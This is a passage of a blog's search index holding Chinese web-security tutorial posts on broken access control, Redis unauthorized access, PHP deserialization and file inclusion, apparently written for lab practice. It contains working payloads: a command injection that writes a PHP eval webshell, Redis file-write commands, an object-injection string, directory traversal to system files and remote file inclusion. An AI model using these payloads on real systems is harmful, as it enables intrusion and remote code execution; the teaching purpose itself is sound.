挖掘</h1><table><thead><tr><th>Web功能</th><th>URL关键字</th></tr></thead><tbody><tr><td>分享 <br>转码服务 <br/>在线翻译 <br/>图片加载与下载图片<br/>文章收藏功能 <br/>未公开的API 实现</td><td>share<br/> wap <br/>url<br/> link<br/> src <br/>source<br/> target <br/> display <br/>sourceURL<br/> imageURL<br/> domain</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>失效的访问控制</title>
      <link href="/2022/11/24/%E6%BC%8F%E6%B4%9E/%E5%A4%B1%E6%95%88%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
      <url>/2022/11/24/%E6%BC%8F%E6%B4%9E/%E5%A4%B1%E6%95%88%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="1-失效的访问控制"><a href="#1-失效的访问控制" class="headerlink" title="1.失效的访问控制"></a>1.失效的访问控制</h1><h2 id="1-1-OWASP-Top-10"><a href="#1-1-OWASP-Top-10" class="headerlink" title="1.1  OWASP Top 10"></a>1.1  <strong>OWASP</strong> <strong>Top</strong> <strong>10</strong></h2><h3 id="1-1-1-A5-2017-Broken-Access-Control"><a href="#1-1-1-A5-2017-Broken-Access-Control" class="headerlink" title="1.1.1  A5:2017-Broken Access Control"></a><strong>1.1.1</strong>  <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html"><strong>A5:2017-Broken</strong> <strong>Access</strong> <strong>Control</strong></a></h3><p>​未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p><h3 id="1-1-2-A01-2021-Broken-Access-Control"><a href="#1-1-2-A01-2021-Broken-Access-Control" class="headerlink" title="1.1.2  A01:2021-Broken Access Control"></a><strong>1.1.2</strong>  <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/"><strong>A01:2021-Broken</strong> <strong>Access</strong> <strong>Control</strong></a></h3><p>访问控制强制实施策略，使用户无法在其预期权限之外进行操作。失败的访问控制通常会导致未经授权的信息泄露、修改或销毁所有数据、或在用户权限之外执行业务功能。</p><h2 id="1-2-失效访问控制类别"><a href="#1-2-失效访问控制类别" class="headerlink" title="1.2  失效访问控制类别"></a><strong>1.2</strong>  失效访问控制类别</h2><h3 id="1-2-1-水平越权"><a href="#1-2-1-水平越权" class="headerlink" title="1.2.1  水平越权"></a><strong>1.2.1</strong>  <strong>水平越权</strong></h3><p>在同级别账户中横向移动。</p><h3 id="1-2-2-垂直越权"><a href="#1-2-2-垂直越权" class="headerlink" title="1.2.2  垂直越权"></a><strong>1.2.2</strong>  <strong>垂直越权</strong></h3><p>普通用户获取管理员权限。</p><h2 id="1-3-攻防案例"><a href="#1-3-攻防案例" class="headerlink" title="1.3  攻防案例"></a><strong>1.3</strong>  攻防案例</h2><h3 id="1-3-1-DVWA-越权"><a href="#1-3-1-DVWA-越权" class="headerlink" title="1.3.1  DVWA 越权"></a><strong>1.3.1</strong>  <strong>DVWA</strong> <strong>越权</strong></h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /dvwa_2.0.1/vulnerabilities/exec/source/low.php HTTP/1.1 Host: 192.168.111.15</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.111.15/dvwa_2.0.1/vulnerabilities/exec/source/</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1 Cache-Control: max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded Content-Length: 77</span><br><span class="line"></span><br><span class="line">ip=127.0.0.0.1|echo+&quot;&lt;?php+@eval($_REQUEST[777])?&gt;&quot;+&gt;+shell.php&amp;Submit=Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-4-相关漏洞"><a href="#1-4-相关漏洞" class="headerlink" title="1.4 相关漏洞"></a>1.4 相关漏洞</h2><h3 id="1-4-1-目录遍历"><a href="#1-4-1-目录遍历" class="headerlink" title="1.4.1  目录遍历"></a><strong>1.4.1</strong>  <strong>目录遍历</strong></h3><p>目录穿越，目录遍历，Directory Traversal。Web 用户，通过某种方式，可以访问Web 根目录以外的文件，甚至执行系统命令。造成目录遍历漏洞的原因：</p><ul><li><p>文件包含</p></li><li><p>文件读取</p></li><li><p>RCE</p></li></ul><h3 id="1-4-2-未授权访问"><a href="#1-4-2-未授权访问" class="headerlink" title="1.4.2 未授权访问"></a>1.4.2 未授权访问</h3><p>未授权访问，Unauthorized Access。重要资产根本没有做访问控制限制，导致黑客攻击者可以在没有授权的情况下操作重要资产，包括读写文件，执行命令等敏感操作。</p><h1 id="2-未授权访问"><a href="#2-未授权访问" class="headerlink" title="2.未授权访问"></a>2.未授权访问</h1><h2 id="2-1-Redis-未授权访问"><a href="#2-1-Redis-未授权访问" class="headerlink" title="2.1  Redis 未授权访问"></a><strong>2.1</strong>  <strong>Redis</strong> 未授权访问</h2><h3 id="2-1-1-Redis-介绍"><a href="#2-1-1-Redis-介绍" class="headerlink" title="2.1.1  Redis 介绍"></a><strong>2.1.1</strong>  <strong>Redis</strong> <strong>介绍</strong></h3><ul><li><p>Redis 是非关系型数据库系统，没有库表列的逻辑结构，仅仅以键值对的方式存储数据。</p></li><li><p>Redis 数据库经常用于Web 应用的缓存。</p></li><li><p>Redis 可以与文件系统进行交互。</p></li><li><p>Redis 监听TCP&#x2F;6379。</p></li></ul><h3 id="2-1-2-Redis-简单使用"><a href="#2-1-2-Redis-简单使用" class="headerlink" title="2.1.2  Redis 简单使用"></a><strong>2.1.2</strong>  <strong>Redis</strong> <strong>简单使用</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(cgjil�� zh-CN)-[~/vulhub/vulhub/redis/4-unacc]</span><br><span class="line">└─$ redis-cli -h 127.0.0.1 127.0.0.1:6379&gt; set name cgjil OK</span><br><span class="line">127.0.0.1:6379&gt; get name &quot;cgjil&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dir /tmp/</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename cgjil.txt OK</span><br><span class="line">127.0.0.1:6379&gt; save OK</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-1-3-Redis-未授权访问"><a href="#2-1-3-Redis-未授权访问" class="headerlink" title="2.1.3  Redis 未授权访问"></a><strong>2.1.3</strong>  <strong>Redis</strong> <strong>未授权访问</strong></h3><table><thead><tr><th>读取数据内容</th><th>读写系统文件</th></tr></thead><tbody><tr><td>数据 泄露</td><td>直接写webshell<br />计划任务反弹shell<br />SSH免密登录</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2022/11/21/%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/11/21/%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><p>为什么要序列化？</p><p> 序列化，“将对象的状态信息转换为可以存储或传输的形式的过程”，这种形式⼤多为字节流、字符串、json 串。在序列化期间内，将对象当前状态写⼊到临时或永久性的存储区。以后，就可以通过从存储区中读取或还原（反序列化）对象的状态，重新创建该对象。简单的说，序列化就是把一个对象变成可以传输的字符串，可以以特定的格式在进程之间跨平台安全的进⾏通信。</p><h2 id="1-序列化与反序列化"><a href="#1-序列化与反序列化" class="headerlink" title="1.序列化与反序列化"></a>1.序列化与反序列化</h2><h4 id="1-1-引例"><a href="#1-1-引例" class="headerlink" title="1.1 引例"></a><strong>1.1</strong> 引例</h4><p>JSON 数据是数据的一种表达形式，与Python ⾥的字典类似。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// json.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$stu</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>   =&gt; <span class="string">&#x27;cgjil&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt; <span class="number">18</span>,</span><br><span class="line"><span class="string">&#x27;sex&#x27;</span>=&gt; <span class="literal">true</span>, <span class="string">&#x27;score&#x27;</span> =&gt; <span class="number">89.9</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $stu;</span></span><br><span class="line"><span class="comment">// var_dump($stu);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$stu_json</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$stu</span>); <span class="keyword">echo</span> <span class="variable">$stu_json</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stu_json</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;stu&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;stu&#x27;</span>]:<span class="variable">$stu_json</span>;</span><br><span class="line"><span class="variable">$stu</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$stu_json</span>); <span class="title function_ invoke__">var_dump</span>(<span class="variable">$stu</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>验证：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?stu=&#123;&quot;name&quot;:&quot;cgjil&quot;,&quot;age&quot;:19,&quot;sex&quot;:true,&quot;score&quot;:89.9&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-序列化实例"><a href="#1-2-序列化实例" class="headerlink" title="1.2 序列化实例"></a><strong>1.2</strong> 序列化实例</h4><h6 id="1-2-1-定义一个类"><a href="#1-2-1-定义一个类" class="headerlink" title="1.2.1  定义一个类"></a><strong>1.2.1</strong>  定义一个类</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//   stu.class.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stu</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>; <span class="keyword">public</span> <span class="variable">$age</span>; <span class="keyword">public</span> <span class="variable">$sex</span>; <span class="keyword">public</span> <span class="variable">$score</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="1-2-2-创建对象"><a href="#1-2-2-创建对象" class="headerlink" title="1.2.2  创建对象"></a><strong>1.2.2</strong>  创建对象</h6><p>创建一个对象，并对该对象进⾏序列化操作，将对象转化为可以存储、传输的字符串。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// serialize.php</span></span><br><span class="line"><span class="keyword">include</span>   <span class="string">&quot;./stu.class.php&quot;</span>;</span><br><span class="line"><span class="variable">$stu1</span> = <span class="keyword">new</span> <span class="title class_">Stu</span>();</span><br><span class="line"><span class="variable">$stu1</span> -&gt; name= <span class="string">&quot;cgjil&quot;</span>;<span class="comment">//$stu1.name</span></span><br><span class="line"><span class="variable">$stu1</span> -&gt; age= <span class="number">24</span>;</span><br><span class="line"><span class="variable">$stu1</span> -&gt; sex= <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$stu1</span> -&gt; score   = <span class="number">99.9</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $stu1;</span></span><br><span class="line"><span class="comment">// var_dump($stu1);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_stu1</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$stu1</span>); <span class="keyword">echo</span> <span class="variable">$_stu1</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>序列化后的字符串：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:3:&quot;Stu&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;cgjil&quot;;s:3:&quot;age&quot;;i:24;s:3:&quot;sex&quot;;b:1;s:5:&quot;score&quot;;d:99.900000000000006;&#125;</span><br></pre></td></tr></table></figure><h6 id="1-2-3-反序列化"><a href="#1-2-3-反序列化" class="headerlink" title="1.2.3  反序列化"></a><strong>1.2.3</strong>  反序列化</h6><p>将字符串转化为对象。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//   unserialize.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./stu.class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stu1_ser</span> = <span class="string">&#x27;O:3:&quot;Stu&quot;:4: &#123;s:4:&quot;name&quot;;s:5:&quot;cgjil&quot;;s:3:&quot;age&quot;;i:24;s:3:&quot;sex&quot;;b:1;s:5:&quot;score&quot;;d:99.900000000000006;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stu1_obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$stu1_ser</span>); <span class="title function_ invoke__">var_dump</span>(<span class="variable">$stu1_obj</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="1-2-4-对象注⼊"><a href="#1-2-4-对象注⼊" class="headerlink" title="1.2.4  对象注⼊"></a><strong>1.2.4</strong>  对象注⼊</h6><p>如果反序列化字符串，Web ⽤⼾可以控制，则造成对象注⼊。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $stu1_seria = &#x27;O:3:&quot;Stu&quot;:4: &#123;s:4:&quot;name&quot;;s:5:&quot;cgjil&quot;;s:3:&quot;age&quot;;i:24;s:3:&quot;sex&quot;;b:1;s:5:&quot;score&quot;;d:99.900000000000006;&#125;&#x27;;</span></span><br><span class="line"><span class="variable">$stu1_ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PHP 的反序列化漏洞也叫PHP 对象注⼊，是一个⾮常常⻅的漏洞，这种漏洞在某些场景下虽然有些难以利⽤，但是一旦利⽤成功就会造成⾮常危险的后果。</p><h2 id="2-漏洞何在"><a href="#2-漏洞何在" class="headerlink" title="2.漏洞何在"></a>2.漏洞何在</h2><h4 id="2-1-漏洞触发"><a href="#2-1-漏洞触发" class="headerlink" title="2.1 漏洞触发"></a><strong>2.1</strong> 漏洞触发</h4><h6 id="2-1-1-有一个类"><a href="#2-1-1-有一个类" class="headerlink" title="2.1.1  有一个类"></a><strong>2.1.1</strong>  有一个类</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  vul.class.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vul</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span> = <span class="string">&quot;cgjil&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo &quot;This is function __destruct()&quot;; @eval($this -&gt; str);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="2-1-2-有一个对象"><a href="#2-1-2-有一个对象" class="headerlink" title="2.1.2  有一个对象"></a><strong>2.1.2</strong>  有一个对象</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;./vul.class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Vul</span>(); <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$_s</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s_ser&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s_ser&#x27;</span>]:<span class="string">&#x27;O:3:&quot;Vul&quot;:1:&#123;s:3:&quot;str&quot;;s:5:&quot;cgjil&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_s</span>); <span class="title function_ invoke__">var_dump</span>(<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>序列化后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:3:&quot;Vul&quot;:1:&#123;s:3:&quot;str&quot;;s:5:&quot;cgjil&quot;;&#125;</span><br></pre></td></tr></table></figure><h6 id="2-1-3-反序列化执⾏代码"><a href="#2-1-3-反序列化执⾏代码" class="headerlink" title="2.1.3  反序列化执⾏代码"></a><strong>2.1.3</strong>  反序列化执⾏代码</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?obj=O:3:&quot;Vul&quot;:1:&#123;s:3:&quot;str&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-为什么会这样"><a href="#2-2-为什么会这样" class="headerlink" title="2.2 为什么会这样"></a><strong>2.2</strong> 为什么会这样</h4><p>__destruct()，会被对象⾃动调⽤。</p><p>以 __  开头的函数，是PHP 中的魔术⽅法。类中的魔术⽅法，在特定情况下会⾃动调⽤。即使魔术⽅法在类中没有被定义，也是真实存在的。</p><table><thead><tr><th>魔术⽅法</th><th>触发条件</th></tr></thead><tbody><tr><td>__construct()</td><td>在创建对象时⾃动调⽤，构造函数</td></tr><tr><td>__destruct()</td><td>在销毁对象时⾃动调⽤，析构函数</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__call(); </span><br><span class="line">__callStatic();</span><br><span class="line">__get();</span><br><span class="line">__set();</span><br><span class="line">__isset();</span><br><span class="line">__unset();</span><br><span class="line">__sleep(); </span><br><span class="line">__wakeup(); </span><br><span class="line">__toString();</span><br><span class="line">__invoke(); </span><br><span class="line">__set_state();</span><br><span class="line">__clone(); </span><br><span class="line">__debuginfo();</span><br></pre></td></tr></table></figure><p>漏洞形成的根本原因就是程序没有对⽤⼾输⼊的反序列化字符串进⾏检测，导致反序列化过程可以被恶意控制，进而造成代码执⾏、GetShell 等一系列不可控的后果。反序列化漏洞并不是PHP 特有的，也存在于Java、Python 语⾔中，其原理基本相同。</p><h2 id="3-反序列化漏洞攻防"><a href="#3-反序列化漏洞攻防" class="headerlink" title="3.反序列化漏洞攻防"></a>3.反序列化漏洞攻防</h2><h4 id="3-1-PHP-反序列化实例"><a href="#3-1-PHP-反序列化实例" class="headerlink" title="3.1 PHP 反序列化实例"></a><strong>3.1</strong> <strong>PHP</strong> 反序列化实例</h4><p><a href="https://www.cnblogs.com/litlife/p/10798061.html">typecho 反序列化漏洞</a></p><h4 id="3-2-Java-反序列化实例"><a href="#3-2-Java-反序列化实例" class="headerlink" title="**3.2 Java 反序列化实例"></a>**3.2 <strong>Java</strong> 反序列化实例</h4><p><a href="https://vulhub.org/#/environments/weblogic/CVE-2017-10271/">Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞</a></p><p><a href="https://vulhub.org/#/environments/struts2/s2-045/">S2-045 Remote Code Execution Vulnerablity</a></p><p><a href="https://vulhub.org/#/environments/jboss/CVE-2017-12149/">JBoss 5.x&#x2F;6.x 反序列化漏洞</a></p><p><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">fastjson 1.2.24 反序列化导致任意命令执⾏漏洞</a></p><p><a href="https://vulhub.org/#/environments/fastjson/1.2.47-rce/">Fastjson 1.2.47 远程命令执⾏漏洞</a></p><p><a href="https://vulhub.org/#/environments/shiro/CVE-2016-4437/">Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</a></p><h4 id="3-3-反序列化漏洞防御"><a href="#3-3-反序列化漏洞防御" class="headerlink" title="3.3 反序列化漏洞防御"></a><strong>3.3</strong> 反序列化漏洞防御</h4><p>升级组件到最新版本</p><p>⿊⽩名单过滤敏感字符禁⽤反序列化功能</p><p>部署安全设备</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2022/11/19/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2022/11/19/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="1-文件包含概述"><a href="#1-文件包含概述" class="headerlink" title="1.文件包含概述"></a>1.文件包含概述</h1><p>​程序开发人员通常会把可重复使用函数或语句写到单个文件中，形成“封装”。在使用某个功能的时候，直接调用此文件，无需再次编写，提高代码重用性，减少代码量。这种调用文件的过程通常称为包含。</p><p>​程序开发人员都希望代码更加灵活，所以会把被包含的文件的路径设置为变量，来进行动态调用（包含），但正是由于这种灵活性，如果被包含文件的路径客户端可控，造成任意文件包含漏洞。</p><p>​几乎所有的脚本都会提供文件包含的功能，文件包含漏洞在PHP 的Web 应用中居多，在JSP&#x2F;ASP&#x2F;ASP.NET 程序中比较少。</p><h2 id="1-1-文件包含语句"><a href="#1-1-文件包含语句" class="headerlink" title="1.1 文件包含语句"></a><strong>1.1</strong> 文件包含语句</h2><p>PHP 提供了四个文件包含的语句，四个语句之间略有不同。</p><table><thead><tr><th>语句</th><th>区别</th></tr></thead><tbody><tr><td>include（）</td><td>多次包含，多次执行；  如果包含失败，脚本产生警告，继续运行。</td></tr><tr><td>include_once()</td><td>多次包含，一次执行；  如果包含失败，脚本产生警告，继续运行。</td></tr><tr><td>require()</td><td>多次包含，多次执行；  如果包含失败，脚本产生错误，结束执行。</td></tr><tr><td>require_once()</td><td>多次包含，一次执行；  如果包含失败，脚本产生错误，结束执行。</td></tr></tbody></table><h3 id="1-1-1-相关配置"><a href="#1-1-1-相关配置" class="headerlink" title="1.1.1  相关配置"></a><strong>1.1.1</strong>  <strong>相关配置</strong></h3><p>​文件包含是PHP 的基本功能之一，有本地文件包含与远程文件包含之分。简单来说，本地文件包含就是可以读取和打开本地文件，远程文件包含就是可以远程（方式）加载文件。可以通过php.ini 中的选项进行配置。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = On/Off         <span class="comment"># 通过远程方式打开文件</span></span><br><span class="line"></span><br><span class="line">allow_url_include = On/Off       <span class="comment"># 通过远程方式包含文件</span></span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h2 id="1-2-动态包含"><a href="#1-2-动态包含" class="headerlink" title="1.2 动态包含"></a><strong>1.2</strong> 动态包含</h2><h3 id="1-2-1-示例代码"><a href="#1-2-1-示例代码" class="headerlink" title="1.2.1  示例代码"></a><strong>1.2.1</strong>  <strong>示例代码</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// file-include.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;filepath&#x27;</span>]; </span><br><span class="line">@<span class="keyword">include</span> <span class="variable">$fp</span>;</span><br></pre></td></tr></table></figure><h3 id="1-2-2-本地文件包含"><a href="#1-2-2-本地文件包含" class="headerlink" title="1.2.2  本地文件包含"></a><strong>1.2.2</strong>  <strong>本地文件包含</strong></h3><p>本地文件包含（Local File Include，LFI）通过本地路径访问到的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filepath=../phpinfo.php</span><br></pre></td></tr></table></figure><h3 id="1-2-3-远程文件包含"><a href="#1-2-3-远程文件包含" class="headerlink" title="1.2.3  远程文件包含"></a><strong>1.2.3</strong>  <strong>远程文件包含</strong></h3><p>远程文件包含（Remote File Include，RFI），通过远程路径访问到的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filepath=http:<span class="comment">//10.9.64.180/phpinfo.jpg</span></span><br></pre></td></tr></table></figure><h2 id="1-3漏洞原理"><a href="#1-3漏洞原理" class="headerlink" title="1.3漏洞原理"></a>1.3漏洞原理</h2><h3 id="1-3-1-漏洞原理"><a href="#1-3-1-漏洞原理" class="headerlink" title="1.3.1 漏洞原理"></a><strong>1.3.1</strong> 漏洞原理</h3><p>PHP 文件包含是程序设计的基础功能之一，能够减少代码量，提高开发效率。但是使用文件包含功能时，有类似于以上测试代码的设计，实现了动态包含，就有产生文件包含漏洞的风险。如果实现动态包含的参数，Web 应用没有进行严格的校验，浏览器客户端用户可以影响控制被包含文件的路径，就会产生任意文件包含漏洞。</p><h3 id="1-3-2-特点"><a href="#1-3-2-特点" class="headerlink" title="1.3.2  特点"></a><strong>1.3.2</strong>  <strong>特点</strong></h3><p>无视文件扩展名读取文件内容。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filepath=./a.jpg</span><br></pre></td></tr></table></figure><p>无条件解析PHP 代码，为图片木马提供了出路。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filepath=a_yjh_info.jpg</span><br></pre></td></tr></table></figure><h1 id="2-文件包含攻防"><a href="#2-文件包含攻防" class="headerlink" title="2.文件包含攻防"></a>2.文件包含攻防</h1><h2 id="2-1-利用方法"><a href="#2-1-利用方法" class="headerlink" title="2.1 利用方法"></a><strong>2.1</strong> 利用方法</h2><h3 id="2-1-1-包含图片木马"><a href="#2-1-1-包含图片木马" class="headerlink" title="2.1.1  包含图片木马"></a><strong>2.1.1</strong>  <strong>包含图片木马</strong></h3><p>菜刀直接链接。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.4.7.130/file-include/file-include.php?filepath=a_yjh_info.jpg</span><br></pre></td></tr></table></figure><h3 id="2-1-2-读取敏感文件"><a href="#2-1-2-读取敏感文件" class="headerlink" title="2.1.2  读取敏感文件"></a><strong>2.1.2</strong>  <strong>读取敏感文件</strong></h3><p>利用文件包含漏洞，也可以读取敏感文件。前提条件：</p><ul><li>目标文件存在（已知目标文件路径）；</li><li>具有文件可读权限。</li></ul><p>具体方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 相对路径</span></span><br><span class="line">?filepath=../../../../../../windows/system32/drivers/etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绝对路径</span></span><br><span class="line">?filepath=c:/windows/system32/drivers/etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用php 封装协议</span></span><br><span class="line">?filepath=file:<span class="comment">//c:/windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>封装协议</th><th>说明</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>访问本地文件系统</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>访问 HTTP(s) 网址</td></tr><tr><td>ftp:&#x2F;&#x2F;</td><td>访问 FTP(s) URLs</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>访问各个输入&#x2F;输出流（I&#x2F;O streams）</td></tr><tr><td>zlib:&#x2F;&#x2F;</td><td>压缩流</td></tr><tr><td>data:&#x2F;&#x2F;</td><td>数据（RFC 2397）</td></tr><tr><td>glob:&#x2F;&#x2F;</td><td>查找匹配的文件路径模式</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP 归档</td></tr><tr><td>ssh2:&#x2F;&#x2F;</td><td>Secure Shell 2</td></tr><tr><td>rar:&#x2F;&#x2F;</td><td>RAR</td></tr><tr><td>ogg:&#x2F;&#x2F;</td><td>音频流</td></tr><tr><td>expect:&#x2F;&#x2F;</td><td>处理交互式的流</td></tr></tbody></table><h3 id="2-1-3-读取-PHP-文件源码"><a href="#2-1-3-读取-PHP-文件源码" class="headerlink" title="2.1.3  读取****PHP 文件源码"></a><strong>2.1.3</strong>  <strong>读取****PHP</strong> <strong>文件源码</strong></h3><p>利用php:&#x2F;&#x2F;fileter 读取。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filepath=php://filter/read=convert.base64-encode/resource=[目标文件]</span><br></pre></td></tr></table></figure><p>读取结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHANCi8vIGZpbGUtaW5jbHVkZS5waHANCg0KJGZwID0gQCRfR0VUWydmaWxlcGF0aCddOw0KQGluY2x1ZGUgJGZwOw==</span><br></pre></td></tr></table></figure><h3 id="2-1-4-执行PHP-命令"><a href="#2-1-4-执行PHP-命令" class="headerlink" title="2.1.4  执行PHP 命令"></a><strong>2.1.4</strong>  <strong>执行</strong>PHP <strong>命令</strong></h3><p>利用php:</p><ul><li><p>&#x2F;&#x2F;input 执行PHP 命令；</p></li><li><p>远程文件包含开启。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
